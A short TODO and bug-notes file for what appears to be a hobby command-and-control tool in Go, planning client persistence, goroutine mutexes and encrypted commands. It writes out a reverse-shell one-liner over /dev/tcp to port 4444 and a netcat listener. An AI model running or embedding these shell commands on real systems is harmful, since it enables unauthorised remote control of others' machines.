# Todo

- Ill implement a netcat connection instead of creating a shell because thats a lot of work for no reason
    - The idea is that the client will receive a "getShell" string and will connect to a nc connection from the server `sh -i >& /dev/tcp/127.0.0.1/4444 0>&1` (`getCommands` function)
    - In the server, he will be waiting for a nc connection from the client IP (localhost for now) `nc -lvp 4444`
    - For now this is a rev shell but the ideal was a bind shell , this way the client would wait for a connection from the server

- Server could exit but clients should continue running and when server starts again, goes check what clients are still on

- Implement mutexes to control goroutines

- Implement command encription on server and command decription on client with one time key given on c2 server startup

## Bugs

- Bug when using a client because the output of the command goes after the next input (@bug1)
    - This is bad
        ```
        command in client (c82d6c71-d8b3-454e-b57b-025999f32e1a) > ls

        command in client (c82d6c71-d8b3-454e-b57b-025999f32e1a) >
        go.mod
        go.sum
        main.go
        ```

    - This is good
        ```
        command in client (c82d6c71-d8b3-454e-b57b-025999f32e1a) > ls
        go.mod
        go.sum
        main.go

        command in client (c82d6c71-d8b3-454e-b57b-025999f32e1a) >
        ```